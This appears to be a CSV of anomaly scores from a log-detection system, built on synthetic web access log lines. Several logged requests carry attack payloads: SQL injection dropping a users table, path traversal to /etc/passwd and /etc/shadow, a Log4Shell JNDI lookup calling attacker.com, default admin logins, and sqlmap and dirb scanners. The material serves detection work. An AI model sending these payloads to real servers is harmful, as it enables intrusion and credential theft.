score_content,score_session,score_fused,score_fused_norm,line
24.584489822387695,,24.584489822387695,24.584489822387695,15.168.90.10 - - [10/Jan/2025:12:00:00 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 4958 "-" "curl/7.68.0"
24.752777099609375,,24.752777099609375,24.752777099609375,13.28.107.46 - - [10/Jan/2025:12:00:05 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 2973 "https://example.com/" "curl/7.68.0"
11021.0400390625,,11021.0400390625,11021.0400390625,93.239.10.24 - - [10/Jan/2025:12:00:09 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 500 1185 "https://example.com/" "python-requests/2.31.0"
4.7772321701049805,,4.7772321701049805,4.7772321701049805,17.75.121.35 - - [10/Jan/2025:12:00:11 +0100] "GET /about HTTP/1.1" 302 18137 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.349515914916992,,27.349515914916992,27.349515914916992,28.147.187.251 - - [10/Jan/2025:12:00:13 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 301 2006 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.778547286987305,,24.778547286987305,24.778547286987305,67.135.148.160 - - [10/Jan/2025:12:00:18 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 10470 "https://www.google.com/" "sqlmap/1.5.10#stable"
25.01426887512207,,25.01426887512207,25.01426887512207,227.157.60.182 - - [10/Jan/2025:12:00:22 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 5995 "https://www.google.com/" "python-requests/2.31.0"
0.1378157138824463,,0.1378157138824463,0.1378157138824463,189.218.54.205 - - [10/Jan/2025:12:00:22 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 201 3964 "https://news.ycombinator.com/" "dirb/2.22"
24.590852737426758,,24.590852737426758,24.590852737426758,177.73.66.203 - - [10/Jan/2025:12:00:22 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 6692 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.638002395629883,,27.638002395629883,27.638002395629883,176.86.88.102 - - [10/Jan/2025:12:00:24 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 304 3830 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30146.888671875,,30146.888671875,30146.888671875,235.122.205.10 - - [10/Jan/2025:12:00:25 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 404 981 "https://news.ycombinator.com/" "curl/7.68.0"
24.8392391204834,,24.8392391204834,24.8392391204834,238.191.15.214 - - [10/Jan/2025:12:00:26 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 13664 "https://twitter.com/" "python-requests/2.31.0"
1.9651354551315308,,1.9651354551315308,1.9651354551315308,205.235.228.204 - - [10/Jan/2025:12:00:31 +0100] "GET /admin HTTP/1.1" 200 10969 "-" "sqlmap/1.5.10#stable"
